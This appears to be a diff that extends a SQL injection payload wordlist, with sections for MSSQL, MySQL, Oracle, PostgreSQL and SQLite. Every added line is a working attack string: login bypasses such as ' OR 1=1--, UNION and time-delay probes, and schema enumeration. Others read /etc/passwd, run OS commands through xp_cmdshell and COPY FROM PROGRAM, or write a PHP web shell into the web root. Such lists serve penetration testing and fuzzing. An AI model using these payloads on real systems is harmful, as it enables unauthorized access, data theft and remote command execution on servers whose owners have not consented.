@@ -103,3 +103,75 @@ CHAR(39,79,82,39,49,39,61,39,49)
 ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
 ' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
 {"id": "1' OR 1=1--"}
+'
+"
+'--
+SELECT @@VERSION, SUSER_SNAME(), DB_NAME();
+SELECT name FROM sysobjects WHERE xtype = 'U';
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');
+EXEC xp_cmdshell 'whoami';
+WAITFOR DELAY '0:0:5';
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+'
+"
+'--
+' #
+SELECT @@VERSION, USER(), DATABASE();
+SELECT table_name FROM information_schema.tables;
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+SELECT 'malicious code' INTO OUTFILE '/var/www/html/shell.php';
+SELECT LOAD_FILE('/etc/passwd');
+SELECT CONCAT('a', 'b');
+' OR 1=1--
+' OR 1=1#
+" OR 1=1--
+" OR 1=1#
+admin'--
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+SLEEP(5)
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='
+'
+"
+'--
+SELECT banner FROM v$version;
+SELECT user FROM dual;
+SELECT table_name FROM all_tables;
+SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';
+BEGIN DBMS_LOCK.SLEEP(5); END;
+' OR 1=1--
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
+'
+"
+'--
+SELECT version(), current_user, current_database();
+SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+COPY (SELECT 'malicious') TO '/tmp/test';
+CREATE TABLE shell(output text);
+COPY shell FROM PROGRAM 'id';
+SELECT * FROM shell;
+SELECT pg_sleep(5);
+' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a)--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' OR 1=1--
+'
+"
+'--
+SELECT sqlite_version();
+SELECT name FROM sqlite_master WHERE type='table';
+PRAGMA table_info('users');
+ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
+CREATE TABLE pwn.shell (code TEXT);
+INSERT INTO pwn.shell (code) VALUES ('<?php system($_GET["cmd"]); ?>');
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
